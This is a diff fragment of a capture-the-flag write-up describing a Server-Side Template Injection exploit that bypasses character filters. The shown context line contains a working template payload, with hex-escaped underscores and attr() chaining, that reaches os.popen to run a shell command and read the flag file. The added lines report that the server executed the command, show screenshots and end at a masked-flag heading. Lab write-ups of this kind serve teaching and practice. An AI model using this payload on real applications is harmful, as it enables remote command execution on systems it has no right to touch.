@@ -71,3 +71,13 @@ To exploit a Server-Side Template Injection (SSTI) vulnerability while bypassing
 
 12. Modified the payload to read the contents of the flag file: {{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 
+<img width="1919" height="967" alt="Screenshot 2026-01-22 215429" src="https://github.com/user-attachments/assets/700f0250-1aad-4997-a3a4-2459ae7c504d" />
+
+13. Submitted the payload.
+14. The server executed the command and returned the flag.
+
+<img width="1919" height="945" alt="Screenshot 2026-01-22 215729" src="https://github.com/user-attachments/assets/892af7a6-731d-408b-8e76-fee62e87c3fb" />
+
+---
+
+## Flag (Masked)
